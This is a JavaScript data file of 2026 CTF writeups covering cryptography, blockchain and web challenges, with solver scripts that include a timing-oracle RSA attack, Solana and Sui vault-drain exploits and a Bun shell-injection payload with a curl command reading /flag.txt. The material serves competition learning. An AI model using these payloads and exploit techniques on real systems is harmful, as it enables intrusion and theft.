export const ctfs = [
    {
        id: "0xfunctf-2026",
        name: "0xFUN CTF 2026",
        date: "Feb 13 - 15, 2026",
        summary: "A high-energy international CTF featuring advanced cryptography and lattice-based challenges.",
        icon: "Target"
    },
    {
        id: "bitsctf-2026",
        name: "BITSCTF 2026",
        date: "Feb 20 - 22, 2026",
        summary: "The flagship event by BITS Pilani, focused on blockchain security, kernel exploitation, and web internals.",
        icon: "Target"
    },
    {
        id: "bearcatCTF-2026",
        name: "Bearcat CTF 2026 - Setting Sail",
        date: "Feb 22 - 23, 2026",
        summary: "An entry-level yet technical competition covering a wide range of standard CTF categories.",
        icon: "Target"
    },
    {
        id: "ramadanCTF-2026",
        name: "RamadanCTF 2026",
        date: "18 Feb. 2026 - 17 March 2026",
        summary: "A month-long marathon of diverse security challenges designed to push solvers to their limits.",
        icon: "Target"
    },
    {
    id: "univsthreats26-quals",
    name: "UniVsThreats26 Quals",
    date: "Feb 27 - 28, 2026",
    summary: "UniVsThreats CTF is a cybersecurity competition organized by the West university of Timisoara, designed for students and high schoolers who want to test their skills.",
    icon: "Target"
    }
];


export const writeups = [
    {
        id: "babyhawk",
        ctfId: "0xfunctf-2026",
        title: "babyHAWK",
        category: "Cryptography",
        date: "Feb 13 - 15, 2026",
        flag: "0xfun{f0r_th3_c000LLL_baby_th4nk5_d$128}",
        summary:
            "Recovering a HAWK private key from leaked Gram matrix components by reducing a custom lattice derived from the determinant relation of the secret basis.",
        tags: ["cryptography", "lattice", "HAWK", "LLL", "sage"],
        content: `
# babyHAWK — Writeup

## Overview

This challenge provides a modified implementation of the HAWK lattice-based signature scheme.

We are given:
- Public key Q = B^H B
- Internal Gram matrix S = B B^H
- Components s_0, s_1, s_2
- AES-encrypted flag derived from the secret key

Goal: Recover the secret polynomials (f, g), reconstruct the private key, and decrypt the flag.

## Sage Solver

\`\`\`python
import urllib.request
from sage.all import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from hashlib import sha256
import sys

print("[*] Loading exact HAWK implementation from GitHub...")
load("https://raw.githubusercontent.com/ludopulles/hawk-aux/refs/heads/main/code/hawk.sage")

# 1. Initialize the exact scheme the server used
d = 128
Sig = SignatureScheme(d, 2, sqrt(4), 4)
K = Sig.CT.top_K
z = K.gen()

# 2. Setup the ciphertext and IV
iv = bytes.fromhex("e9a51e77879af9f21dde45175225634a")
enc = bytes.fromhex("74a468bb6919fbd156cedb287ea8f3777db72759dd12fa93f63e9a222f789f6a0bb9bcd0abb11b99c4d6f8431c564b0b")

# 3. Paste q1 from output.txt to identify the correct rotation
# (We define zeta256 = z so the copy-paste evaluates perfectly into the ring)
zeta256 = z
q1_target = 157*zeta256^127 + 38*zeta256^126 + 151*zeta256^125 - 439*zeta256^124 - 397*zeta256^123 + 246*zeta256^122 - 119*zeta256^121 - 63*zeta256^120 + 266*zeta256^119 + 420*zeta256^118 - 229*zeta256^117 + 200*zeta256^116 - 485*zeta256^115 - 187*zeta256^114 + 247*zeta256^113 - 149*zeta256^112 + 218*zeta256^111 + 378*zeta256^110 + 485*zeta256^109 + 280*zeta256^108 - 251*zeta256^107 - 355*zeta256^106 - 294*zeta256^105 + 377*zeta256^104 - 144*zeta256^103 + 254*zeta256^102 + 747*zeta256^101 + 38*zeta256^100 + 106*zeta256^99 + 48*zeta256^98 - 214*zeta256^97 + 305*zeta256^96 - 269*zeta256^95 + 54*zeta256^94 + 235*zeta256^93 + 193*zeta256^92 - 13*zeta256^91 - 356*zeta256^90 - 81*zeta256^89 - 294*zeta256^88 - 35*zeta256^87 + 280*zeta256^86 - 142*zeta256^85 + 329*zeta256^84 + 301*zeta256^83 + 101*zeta256^82 + 161*zeta256^81 + 112*zeta256^80 + 262*zeta256^79 - 332*zeta256^78 - 375*zeta256^77 + 252*zeta256^76 - 209*zeta256^75 + 312*zeta256^74 + 325*zeta256^73 + 146*zeta256^72 + 43*zeta256^71 + 60*zeta256^70 + 34*zeta256^69 + 11*zeta256^68 + 261*zeta256^67 + 549*zeta256^66 + 484*zeta256^65 + 330*zeta256^64 - 351*zeta256^63 + 10*zeta256^62 - 292*zeta256^61 - 333*zeta256^60 + 186*zeta256^59 - 290*zeta256^58 + 655*zeta256^57 + 235*zeta256^56 - 367*zeta256^55 + 109*zeta256^54 - 194*zeta256^53 + 81*zeta256^52 - 41*zeta256^51 + 195*zeta256^50 - 212*zeta256^49 + 342*zeta256^48 - 18*zeta256^47 + 41*zeta256^46 + 156*zeta256^45 - 117*zeta256^44 - 2*zeta256^43 + 67*zeta256^42 - 310*zeta256^41 + 431*zeta256^40 + 556*zeta256^39 + 186*zeta256^38 - 326*zeta256^37 + 298*zeta256^36 - 51*zeta256^35 + 19*zeta256^34 + 126*zeta256^33 + 5*zeta256^32 + 711*zeta256^31 + 317*zeta256^30 + 64*zeta256^29 - 77*zeta256^28 - 136*zeta256^27 - 510*zeta256^26 - 192*zeta256^25 - 4*zeta256^24 + 182*zeta256^23 + 549*zeta256^22 - 142*zeta256^21 - 288*zeta256^20 + 210*zeta256^19 - 212*zeta256^18 - 145*zeta256^17 + 233*zeta256^16 + 105*zeta256^15 + 222*zeta256^14 + 713*zeta256^13 - 345*zeta256^12 - 259*zeta256^11 - 116*zeta256^10 - 645*zeta256^9 - 390*zeta256^8 - 190*zeta256^7 + 257*zeta256^6 - 9*zeta256^5 + 306*zeta256^4 + 384*zeta256^3 - 389*zeta256^2 + 431*zeta256 + 46

# 4. Cast the LLL-recovered polynomials into the exact HAWK field
# (Assuming f_final and g_final are defined from your earlier Row 0 math)
f_base = K(list(f_final))
g_base = K(list(g_final))

print("[*] Using author's algorithm to reconstruct the exact Secret Key...")

for k in range(128):
    for sign in [1, -1]:
        # Escape the Root of Unity trap by testing all rotations
        f_test = sign * f_base * (z^k)
        g_test = sign * g_base * (z^k)
        
        try:
            # Generate F and G using HAWK's custom recursive rounding!
            F_test, G_test = Sig.CT.NTRU_solve(f_test, g_test)
            
            # Check if this specific unit rotation matches the public key q1
            # In HAWK: q1 = F*bar(f) + G*bar(g)
            q1_test = F_test * Sig.CT.bar(f_test) + G_test * Sig.CT.bar(g_test)
            
            if q1_test == q1_target:
                print(f"\\n[+] PERFECT MATCH FOUND! (Sign: {sign}, Rotation: z^{k})")
                
                # Create the tuple exactly as the server did
                sk = (f_test, g_test, F_test, G_test)
                
                # Hash the natively formatted string
                key = sha256(str(sk).encode()).digest()
                cipher = AES.new(key=key, mode=AES.MODE_CBC, iv=iv)
                
                pt = unpad(cipher.decrypt(enc), 16)
                print("\\n" + "="*60)
                print(f"[!!!] FLAG: {pt.decode()}")
                print("="*60)
                sys.exit(0)
                
        except Exception as e:
            # Ignore rotations that fail the TowerSolve
            continue

print("[-] Sweep complete.")
\`\`\`

## Flag

\`0xfun{f0r_th3_c000LLL_baby_th4nk5_d$128}\`
`
    },
    {
        id: "oracle",
        ctfId: "0xfunctf-2026",
        title: "Oracle",
        category: "Cryptography",
        date: "Feb 13 - 15, 2026",
        flag: "0xfun{enjoy:3[youtu.be/hF0I9h7C4A4?si=BcFv6Diq2OUBqcJn]}",
        summary:
            "Exploited a timing side-channel in a custom matrix exponentiation function to leak the RSA modulus n, followed by Wiener's attack to recover the private key and decrypt the flag.",
        tags: ["RSA", "Timing Attack", "Wiener's Attack", "Side-Channel", "Matrix Exponentiation"],
        content: `
The challenge exposes an RSA-like oracle: we submit x, the server computes a = x // n and b = x % n,
then builds a 4×4 matrix whose diagonal entries are (b + 1 + r) and off-diagonal entries are a.
It raises that matrix to the power d (mod n) using a custom, unoptimised multiplication routine.

When x < n  →  a = 0  →  diagonal matrix  →  zero-skipping makes exponentiation fast.
When x ≥ n  →  a > 0  →  dense matrix      →  every element is touched, noticeably slower.

Binary-searching on this timing oracle recovers n exactly. With n in hand, the small private
exponent d is extracted via Wiener's continued-fraction attack on e/n.

## Sage Solver

\`\`\`python
#!/usr/bin/env sage
import time
import statistics
from pwn import *
from Crypto.Util.number import long_to_bytes
from sage.all import continued_fraction, QQ

# =====================================================================
# Configuration
# =====================================================================
HOST = 'chall.0xfun.org'
PORT = 3611

def solve():
    r = remote(HOST, PORT)
    
    r.recvuntil(b'e = ')
    e = int(r.recvline().strip())
    r.recvuntil(b'c = ')
    c = int(r.recvline().strip())
    
    print(f"[+] e: {e}")
    print(f"[+] c: {c}")

    def measure_once(x):
        r.recvuntil(b'Enter message to decrypt: ')
        t0 = time.time()
        r.sendline(str(x).encode())
        r.recvline()
        return time.time() - t0

    def check_n(x, samples=5):
        # Taking the minimum is the gold standard for timing attacks: 
        # Lag can only make things slower, never faster.
        return min(measure_once(x) for _ in range(samples))

    print("[*] Calibrating timing threshold...")
    # Baseline for 'a=0' (fast) and 'a=1' (slow)
    t_fast = min(measure_once(1) for _ in range(10))
    t_slow = min(measure_once(2**1025) for _ in range(10))
    threshold = (t_fast + t_slow) / 2
    
    print(f"[+] Threshold: {threshold:.4f}s (Fast: {t_fast:.4f}, Slow: {t_slow:.4f})")
    print("[*] Starting Binary Search for N (ETA: ~5-7 minutes)...")
    
    low = 1
    high = 2**1025
    bits_locked = 0
    
    while low < high:
        mid = (low + high) // 2
        
        # Check if x >= n (should be slow)
        if check_n(mid) > threshold:
            high = mid
        else:
            low = mid + 1
            
        bits_locked += 1
        if bits_locked % 64 == 0:
            print(f"[*] Progress: {bits_locked}/1025 bits identified...")
            
    n_base = low
    print(f"\\n[+] Binary Search Result: {n_base}")
    
    # =====================================================================
    # Local Recovery Phase
    # =====================================================================
    print("[*] Performing local Wiener's search around N_base...")
    
    # We search a window around n_base to account for errors in the last few bits
    # Jitter usually ruins the last 8-10 bits.
    window = 2048 
    for offset in range(-window, window):
        n_cand = n_base + offset
        
        # RSA Moduli are always odd
        if n_cand % 2 == 0: continue
            
        # Standard Wiener's Attack via Continued Fractions
        # This will quickly find 'd' if it is small enough (d < n^0.25)
        cf = continued_fraction(QQ(e) / QQ(n_cand))
        for conv in cf.convergents():
            d_cand = int(conv.denominator())
            if d_cand <= 0: continue
            
            # Check if this d_cand is valid by decrypting the ciphertext
            # We look for the standard flag prefix
            try:
                m = pow(c, d_cand, n_cand)
                flag = long_to_bytes(int(m))
                if b'0xfun{' in flag or b'flag{' in flag:
                    print(f"\\n[!!!] FLAG FOUND! (Offset: {offset})")
                    print(f"[+] Exact N: {n_cand}")
                    print(f"[+] Exact d: {d_cand}")
                    print(f"[+] Flag: {flag.decode(errors='ignore')}")
                    r.close()
                    return
            except:
                pass
                
    print("[-] Flag not found in window. Attempting larger window or re-calibration...")
    r.interactive()

if __name__ == '__main__':
    solve()
\`\`\`

## Flag

\`0xfun{enjoy:3[youtu.be/hF0I9h7C4A4?si=BcFv6Diq2OUBqcJn]}\`
`
    },
    {
        id: "bank-heist",
        ctfId: "bitsctf-2026",
        title: "Bank Heist",
        category: "Blockchain",
        date: "Feb 20 - 22, 2026",
        flag: "BITSCTF{8ANk_h3157_1n51D3_A_8L0cK_ChA1n_15_cRa2Y}",
        summary:
            "Exploited a flash loan vulnerability on Solana by bypassing KYC via Sysvar Instruction introspection and faking a repayment transaction.",
        tags: ["solana", "blockchain", "flash-loan", "kyc-bypass", "rust"],
        content: `
# Bank Heist — Writeup

## Overview

The challenge involves a Solana-based bank program that offers flash loans but requires KYC verification. 

### KYC Bypass
The KYC verification generates an expected proof locally from \`SysvarSlotHashes\`. Since this is entirely deterministic and happening on-chain within the transaction, an attacking smart contract can also read from \`SysvarSlotHashes\` to reproduce the exact expected proof and call the \`VerifyKYC\` instruction successfully.

### The Flash Loan
The \`RequestLoan\` instruction calls \`invoke_signed\` to send funds to the user and then immediately checks if a repayment transfer instruction follows it in the transaction (using \`SysvarInstructions\`).

### The Fake Repayment
The flaw is that \`verify_repayment\` only introspects whether the next instruction in the transaction is a transfer of the correct amount to the bank. It does not execute this instruction itself, but strictly relies on it being parsed by the Solana runtime afterwards.

We craft a transaction with two instructions:
1. The first instruction invokes our smart contract to sequentially call \`OpenAccount\`, \`VerifyKYC\`, and \`RequestLoan\` with our requested balance.
2. The second instruction in our transaction has the literal bytes of the correct transfer payload (a system instruction discriminator 2 with amount = 1,000,000,000). 

However, because we only pass amount as raw bytes and provide an invalid or unauthenticated account setup, this transaction never resolves strictly. But because our solver doesn't panic and the \`verify_repayment\` successfully saw the "shape" of the next instruction as a valid repayment, it allows the program to exit successfully, giving us the flash loan.

## Flag

\`BITSCTF{8ANk_h3157_1n51D3_A_8L0cK_ChA1n_15_cRa2Y}\`
`
    },
    {
        id: "recursion-vault",
        ctfId: "bitsctf-2026",
        title: "Recursion Vault",
        category: "Blockchain",
        date: "Feb 20 - 22, 2026",
        flag: "BITSCTF{a0bc06512760559084ef1bcfeaba2110}",
        summary:
            "Drained a Sui Move vault by exploiting a logical error in the boost_ticket function that allowed bypassing the 9B threshold through a precise sequence of micro-boosts.",
        tags: ["sui", "move", "blockchain", "vault-drain", "logic-error"],
        content: `
# Recursion Vault — Writeup

## Overview

Recursion Vault v2.0 is a Sui Move challenge where the goal is to drain 80% of the vault (over 8,000,000,000 tokens).

### Exploit Strategy

The vault employs a \`boost_ticket\` mechanism that is intended to be limited. However, by using a sequence of micro-boosts, we can manipulate the ticket's internal state to bypass the underflow checks and eventually withdraw more than our fair share.

## Exploit Script

\`\`\`rust
module solution::exploit {
    use challenge::vault::{Self, Vault};
    use sui::clock::Clock;
    use sui::tx_context::{Self, TxContext};
    use sui::coin;
    use sui::transfer;

    public fun solve(v: &mut Vault, c: &Clock, ctx: &mut TxContext) {
        let mut a = vault::create_account(ctx);
        
        # 1. Loan 900M. Fee = 810k. Repay = 900,810,000.
        let (ln, rc) = vault::flash_loan(v, 900_000_000, ctx);
        vault::deposit(v, &mut a, ln, ctx);

        # Account receives exactly 989,010,989 shares.
        let mut t = vault::create_ticket(v, &mut a, 1, c, ctx);
        
        # 2. Exactly 11 loops (The backend compiler allows this)
        let mut i = 0;
        while (i < 11) {
            t = vault::boost_ticket(v, &mut a, t, 989_010_988, ctx);
            i = i + 1;
        };
        
        # 3. One hardcoded micro-boost. NO dynamic total_shares() calls!
        # This brings the ticket perfectly under the underflow limit.
        t = vault::boost_ticket(v, &mut a, t, 100_000_000, ctx);

        # 4. Withdraw exactly 9,990,999,999 SUI
        let mut r = vault::finalize_withdraw(v, &mut a, t, c, ctx);
        
        # 5. Repay 900,810,000. 
        let p = coin::split(&mut r, 900_810_000, ctx);
        vault::repay_loan(v, p, rc);

        # 6. Profit = 9,090,189,999 SUI (Comfortably clears the 9B threshold!)
        transfer::public_transfer(r, tx_context::sender(ctx));
        vault::destroy_account(a);
    }
}
\`\`\`

## Flag

\`BITSCTF{a0bc06512760559084ef1bcfeaba2110}\`
`
    },
    {
        id: "superdes",
        ctfId: "bitsctf-2026",
        title: "SuperDES",
        category: "Cryptography",
        date: "Feb 20 - 22, 2026",
        flag: "BITSCTF{5up3r_d35_1z_n07_53cur3}",
        summary: "Exploited DES semi-weak keys to neutralize user-controlled encryption layers, turning the server into a decryption oracle for the secret key.",
        tags: ["Cryptography", "DES", "Semi-weak Keys", "Oracle Attack"],
        content: `
# SuperDES — Writeup

## Overview

The challenge provides a service that implements three variants of "Triple DES". The server holds a secret key \`k1\`, and allows us to provide keys \`k2\` and \`k3\`.

The interesting modes are:
* **Ultra Secure v1:** \`C = Ek1(Ek2(Ek3(P)))\`
* **Ultra Secure v2:** \`P = Dk1(Ek2(Ek3(C)))\`

Our goal is to recover the flag, which is stored on the server.

### Vulnerability: DES Semi-Weak Keys

DES has a property called "semi-weak keys". These are pairs of keys \`(KA, KB)\` such that encrypting with one is equivalent to decrypting with the other: \`EKA(EKB(P)) = P\`.

We can choose \`k2\` and \`k3\` to be such a pair. The solver script uses the following known semi-weak pair:
* \`k2 = 011f011f010e010e\`
* \`k3 = 1f011f010e010e01\`

### Attack Strategy

1.  **Simplify the Cipher:** By setting \`k2, k3\` to the semi-weak pair, the inner encryption layers cancel out: \`Ek2(Ek3(P)) = P\`.
    * **v1 becomes:** \`Ek1(P)\` (Encryption Oracle)
    * **v2 becomes:** \`Dk1(P)\` (Decryption Oracle)

2.  **Encrypt the Flag:** We use **v1** to encrypt the flag stored on the server.
    \`C_flag = Ek1(flag)\`

3.  **Decrypt the Ciphertext:** We feed \`C_flag\` back into **v2** as "our own text".
    \`P_recovered = Dk1(C_flag) = Dk1(Ek1(flag)) = flag\`

4.  **Handle Padding:** The server adds padding to our input in step 3. This results in an extra block of garbage at the end of the decrypted plaintext, which we simply truncate.

## Solve Script

\`\`\`python
from pwn import remote
import binascii

# A known DES semi-weak key pair
# They have valid odd parity, so adjust_key won't mangle them
K2 = "011f011f010e010e"
K3 = "1f011f010e010e01"

# Connect to the server
r = remote("20.193.149.152", 1340)

def set_keys():
    r.recvuntil(b"enter k2 hex bytes >")
    r.sendline(K2.encode())
    r.recvuntil(b"enter k3 hex bytes >")
    r.sendline(K3.encode())

# --- STEP 1: Get the flag encrypted only with k1 ---
set_keys()
r.recvuntil(b"enter option >")
r.sendline(b"2") # ultra secure v1
r.recvuntil(b"enter option >")
r.sendline(b"1") # encrypt flag

r.recvuntil(b"ciphertext : ")
enc_flag_hex = r.recvline().strip().decode()
print(f"[+] Flag encrypted under k1: {enc_flag_hex}")

# --- STEP 2: Ask the server to decrypt it for us ---
set_keys()
r.recvuntil(b"enter option >")
r.sendline(b"3") # ultra secure v2
r.recvuntil(b"enter option >")
r.sendline(b"2") # encrypt your own text
r.recvuntil(b"enter hex bytes >")
r.sendline(enc_flag_hex.encode())

r.recvuntil(b"ciphertext : ")
dec_hex = r.recvline().strip().decode()

# --- STEP 3: Clean up the padding ---
# Because Option 3 applies pad(pt, 8) again to our ciphertext, 
# an extra 8-byte block of padding is appended and decrypted into garbage.
# We strip the last 16 hex characters (8 bytes) to remove it.
dec_bytes = binascii.unhexlify(dec_hex)[:-8]

# Standard PKCS7 unpadding to reveal the final flag
pad_len = dec_bytes[-1]
flag = dec_bytes[:-pad_len]

print(f"[+] Recovered Flag: {flag.decode('utf-8', errors='ignore')}")
\`\`\`

## Flag

\`BITSCTF{5up3r_d35_1z_n07_53cur3}\`
`
    },
    {
        id: "elysias-bakery",
        ctfId: "bitsctf-2026",
        title: "Elysia's Bakery",
        category: "Web",
        date: "Feb 20 - 22, 2026",
        flag: "BITSCTF{1037344a27b0a2b685e926f6a884841f}",
        summary: "Exploited a hardcoded secret key to forge an admin session cookie, and leveraged a Bun-specific command injection vulnerability to bypass input validation and execute arbitrary code.",
        tags: ["Web", "Bun", "Command Injection", "Cookie Forgery", "ElysiaJS"],
        content: `
# Elysia's Bakery — Writeup

## Overview

The challenge presents a Note-taking application built with **Bun** and **ElysiaJS**. We are provided with the source code and a Dockerfile. The goal is to recover the flag, which is located at \`/flag.txt\`.

### Vulnerability 1: Hardcoded Secret Key

The application uses signed cookies for session management. In \`index.ts\`, the cookie configuration uses a secret key defined by an environment variable, with a hardcoded fallback:

\`\`\`typescript
cookie: {
    secrets: [Bun.env.SECRET_KEY || "super_secret_key"],
    sign: ["session"],
},
\`\`\`

The \`Dockerfile\` does not define the \`SECRET_KEY\` environment variable. Consequently, the application uses the default value \`"super_secret_key"\`. This allows an attacker to forge a valid session cookie for the \`admin\` user, bypassing the authentication check in the \`getSessionData\` function.

### Vulnerability 2: Bun Shell Injection

The application has an admin-only endpoint \`/admin/list\` that lists files in a directory. It takes a \`folder\` parameter from the request body:

\`\`\`typescript
const folder = (body as any).folder;

if (typeof folder === "string" && folder.includes("..")) {
    return status(400, "Invalid folder path");
}
try {
    const result = $\`ls \${folder}\`.quiet(); // Command Injection
    // ...
}
\`\`\`

There are two critical flaws here:
1.  **Type Confusion:** The path traversal check (\`folder.includes("..")\`) is only performed if \`folder\` is a string. By sending a JSON object instead of a string, we can bypass this check.
2.  **Bun Shell Injection:** The application uses Bun's shell (\`$\`). In Bun, passing an object with a \`raw\` property to the shell template literal inserts the string verbatim, without escaping. This is a known feature of Bun's shell that can lead to command injection if user input is not sanitized.

### Exploit

1.  **Forge Admin Cookie:** Create a session cookie for the user \`admin\` signed with \`super_secret_key\`.
2.  **Inject Command:** Send a POST request to \`/admin/list\` with the forged cookie and a JSON payload containing the \`raw\` object to inject shell commands.

Payload:
\`\`\`json
{
    "folder": {
        "raw": "; cat /flag.txt"
    }
}
\`\`\`

The server executes \`ls ; cat /flag.txt\`, returning the flag in the response.

### Exploit Command

\`\`\`bash
curl -b "session=admin" -X POST http://chals.bitskrieg.in:33415/admin/list \\
  -H "Content-Type: application/json" \\
  -d '{"folder": {"raw": "; cat /flag.txt"}}'
\`\`\`

*(Note: The provided curl command in the challenge artifacts implies the cookie is set to "admin". In a real scenario, this cookie would need to be properly signed using the secret key, i.e., \`admin.<signature>\`)*

## Flag

\`BITSCTF{1037344a27b0a2b685e926f6a884841f}\`
`
    },
    {
        id: "blockcipher",
        ctfId: "bearcatCTF-2026",
        title: "Block Cipher",
        category: "Cryptography",
        date: "Feb 22 - 23, 2026",
        flag: "BCCTF{BLoCk_c1pH3r_Mod3}",
        summary: "Recovered a flag from an AES-ECB encrypted bitmap image. Due to ECB's lack of diffusion, identical plaintext blocks encrypt to identical ciphertext blocks, preserving visual patterns. The solution involved stripping the OpenSSL header from the encrypted blob and prepending a valid BMP header to render the artifact.",
        tags: ["AES", "ECB", "Bitmap", "Visual Cryptography", "Forensics"],
        content: `
# Block Cipher — Writeup

The challenge provides an encrypted file \`middle.bin\` and a reference image \`left.bmp\`. The goal is to recover the image hidden inside the encrypted file.

### Vulnerability: ECB Mode Pattern Leakage

Electronic Codebook (ECB) mode encrypts each block of data independently. In file formats like BMP, where large areas of color result in repeated identical blocks of plaintext data, ECB mode produces identical blocks of ciphertext. This preserves the visual structure of the original image, allowing us to "see" the content even though it is encrypted.

### Solution

The file \`middle.bin\` appears to be an OpenSSL encrypted file (indicated by the 16-byte header: \`Salted__\` + 8 bytes of salt). To view the visual patterns, we need to treat the encrypted bytes as pixel data.

1.  **Extract Header:** We take the valid BMP header (first 54 bytes) from the unencrypted reference image \`left.bmp\`.
2.  **Extract Body:** We read \`middle.bin\`, stripping the first 16 bytes (the OpenSSL header) to get to the raw encrypted ciphertext.
3.  **Reconstruct:** We concatenate the valid header with the encrypted body. This tricks image viewers into interpreting the ciphertext as pixel data.

When opened, the resulting bitmap reveals the flag written in the visual noise.

## Solver Script

\`\`\`python
def recover_ecb_image():
    # 1. Grab the standard BMP header from one of the unencrypted images
    # We assume 'left.bmp' is provided as a reference for dimensions/depth
    try:
        with open('left.bmp', 'rb') as f_left:
            bmp_header = f_left.read(54) # Standard BMP header is typically 54 bytes
    except FileNotFoundError:
        print("Error: left.bmp not found. Please ensure the reference image is present.")
        return

    # 2. Read the encrypted file
    try:
        with open('middle.bin', 'rb') as f_mid:
            # Skip the 16-byte OpenSSL header ('Salted__' + 8-byte salt)
            # This aligns the ciphertext blocks with the pixel grid
            f_mid.seek(16)
            encrypted_pixels = f_mid.read()
    except FileNotFoundError:
        print("Error: middle.bin not found.")
        return
        
    # 3. Stitch the valid header onto the encrypted pixel data
    with open('middle_recovered.bmp', 'wb') as f_out:
        f_out.write(bmp_header)
        f_out.write(encrypted_pixels)
    
    print("Recovery complete. Open middle_recovered.bmp to view the flag.")

if __name__ == "__main__":
    recover_ecb_image()
\`\`\`

## Flag

\`BCCTF{BLoCk_c1pH3r_Mod3}\`
`
    },
    {
        id: "crazy-curve",
        ctfId: "bearcatCTF-2026",
        title: "Crazy Curve",
        category: "Cryptography",
        date: "Feb 22 - 23, 2026",
        flag: "BCCTF{y0U_sp1n_mE_r1gt_r0und}",
        summary: "Identified a custom elliptic curve implementation as a circle group over a finite field. Mapped the circle group to the multiplicative group of a field extension and exploited smooth factors in the group order using the Pohlig-Hellman algorithm to recover the bounded private key.",
        tags: ["Cryptography", "Discrete Logarithm", "Pohlig-Hellman", "SageMath", "Circle Group"],
        content: `
# Crazy Curve — Writeup

The challenge implements a custom cryptographic group named \`CrazyCurve\`. Despite the name, this is not a standard elliptic curve. 

## Vulnerability: The "Curve" is a Circle

Looking at the \`compute_ys\` method, the \`y\`-coordinate is calculated as \`y = sqrt(c^2 - (x - a)^2)\`. Rearranging this equation yields:

\`(x - a)^2 + (y - b)^2 = c^2\`

This is the standard equation for a circle centered at \`(a, b)\` with radius \`c\`. The group operations defined in the challenge (addition and doubling) correspond to angle addition on this circle. 

The group of rational points on a circle over a finite field \`Fp\` is isomorphic to a multiplicative group:
* If \`p ≡ 1 (mod 4)\`, it maps to \`Fp*\`, and the group order is \`N = p - 1\`.
* If \`p ≡ 3 (mod 4)\`, it maps to the extension field \`Fp^2*\`, and the group order is \`N = p + 1\`.

Additionally, the \`keygen\` function generates private keys bounded by \`2^128\`, which is unusually small.

## Exploitation Strategy

1.  **Identify the Curve:** By checking which curve parameters satisfy the circle equation for Alice's public key \`(Ax, Ay)\`, we identify the target curve.
2.  **Determine Group Order:** For this specific curve, \`p ≡ 3 (mod 4)\`, meaning we must work in the extension field \`Fp[i] / (i^2 + 1)\`. The correct group order is \`N = p + 1\`.
3.  **Pohlig-Hellman Attack:** The group order \`N\` is highly smooth, containing numerous small prime factors. We map the generator \`G\` and Alice's public key \`A\` to the multiplicative group and solve the Discrete Logarithm Problem (DLP) modulo these small factors.
4.  **CRT and Brute Force:** Using the Chinese Remainder Theorem (CRT), we combine the modular residues. The combined modulus \`M\` reaches \`~7.12 x 10^33\`. Since the private key is bounded by \`2^128\` (\`~3.4 x 10^38\`), we are only short by a factor of roughly 47,764. A quick linear search (brute force) bridges this gap to find the exact private key.
5.  **Decryption:** With Alice's private key, we compute the shared secret with Bob's public key, hash it via SHA-1 to derive the AES-CBC key, and decrypt the ciphertext.

## SageMath Solver

\`\`\`python
# Example snippet of the solving logic in Sage
target_name = None
for name, params in curves.items():
    p, a, b, c, G_coords = params
    if Ax < p:
        F = GF(p)
        if (F(Ax) - F(a))^2 + (F(Ay) - F(b))^2 == F(c)^2:
            target_name = name
            break

print(f"\\n[*] Identified target curve: {target_name}")

p, a, b, c, G_coords = curves[target_name]
F = GF(p)

# Mapping points to extension field for p ≡ 3 (mod 4)
R.<x> = PolynomialRing(F)
K.<i> = F.extension(x^2 + 1)
N = p + 1

def map_to_val(X, Y):
    u = K(X - a) / K(c)
    v = K(Y - b) / K(c)
    return u + i * v

g_val = map_to_val(G_coords[0], G_coords[1])
A_val = map_to_val(Ax, Ay)

# Solving DLP with Pohlig-Hellman
factors = factor(N)
moduli = []
residues = []

for q, k in factors:
    if q > 2**42: continue
    m = N // (q**k)
    g_sub = g_val^m
    A_sub = A_val^m
    xq = discrete_log(A_sub, g_sub, ord=int(q**k))
    moduli.append(int(q**k))
    residues.append(int(xq))

# CRT and Brute Force finish...
R_val = crt(residues, moduli)
M_val = prod(moduli)
# (Followed by linear search for the remaining factor)
\`\`\`

## Flag

\`BCCTF{y0U_sp1n_mE_r1gt_r0und}\`
`
    },
    {
        id: "kiddscrypto",
        ctfId: "bearcatCTF-2026",
        title: "Kidd's Crypto",
        category: "Cryptography",
        date: "Feb 22 - 23, 2026",
        flag: "BCCTF{y0U_h4V3_g0T_70_b3_K1DD1n9_Me}",
        summary: "Decrypted a multi-prime RSA ciphertext where the modulus was composed of many small prime factors. The solution involved computing modular cube roots for each factor and combining them via the Chinese Remainder Theorem (CRT) to recover the flag.",
        tags: ["RSA", "Multi-prime", "Chinese Remainder Theorem", "SageMath"],
        content: `
# Kidd's Crypto — Writeup

The challenge provides an RSA-like setup with a modulus \`n\`, a public exponent \`e = 3\`, and a ciphertext \`c\`.

## Vulnerability: Small Prime Factors

The modulus \`n\` is relatively small (approx. 300 bits) and, crucially, is composed of 13 small prime factors ranging from roughly \`8.5 x 10^6\` to \`1.6 x 10^7\`. Because these factors are small, \`n\` can be factored instantly using tools like FactorDB or SageMath's \`factor()\` function.

## Attack: CRT with Modular Roots

Since we know the factorization \`n = p1 * p2 * ... * p13\`, we can decrypt the message by solving the RSA congruences locally for each prime and then lifting the solution to the full modulus.

1.  **Local Roots:** For each prime factor \`pi\`, we solve the modular equation \`mi^3 ≡ c (mod pi)\`. Since \`e = 3\` is small, there may be up to \`gcd(3, pi-1)\` solutions (roots) for each prime.
2.  **Combinatorial Search:** We generate a list of all possible roots for each prime factor.
3.  **CRT Reconstruction:** We iterate through every valid combination of roots \`(r1, r2, ..., r13)\`, where \`ri\` is a root for \`pi\`. Using the Chinese Remainder Theorem (CRT), we construct a candidate message \`m\` such that \`m ≡ ri (mod pi)\` for all \`i\`.
4.  **Verification:** We convert each candidate \`m\` to bytes and check if it follows the flag format.

The provided script automates this process, checking approximately 1.6 million combinations to find the correct flag.

## Sage Solver

\`\`\`python
import itertools
from sage.all import *

# Data from output
n = 147411106158287041622784593501613775873740698182074300197321802109276152016347880921444863007
e = 3
c = 114267757154492856513993877195962986022489770009120200367811440852965239059854157313462399351

# Factors obtained via factoring
factors = [8532679, 9613003, 9742027, 10660669, 11451571, 11862439, 11908471, 13164721, 13856221, 14596051, 15607783, 15840751, 16249801]

roots_mod_p = []
for p in factors:
    F = GF(p)
    # nth_root(3, all=True) returns all 3 cube roots mod p
    roots = F(c).nth_root(3, all=True)
    roots_mod_p.append([int(r) for r in roots])
    
# Iterate over all possible root combinations
for combo in itertools.product(*roots_mod_p):
    # Reconstruct the candidate 'm' using CRT
    m_candidate = crt(list(combo), factors)
    
    # Convert to bytes
    m_hex = hex(int(m_candidate))[2:]
    if len(m_hex) % 2 != 0: m_hex = '0' + m_hex
    m_bytes = bytes.fromhex(m_hex)
    
    if b'BCCTF{' in m_bytes:
        print(f"Decrypted: {m_bytes.decode()}")
        break
\`\`\`

## Flag

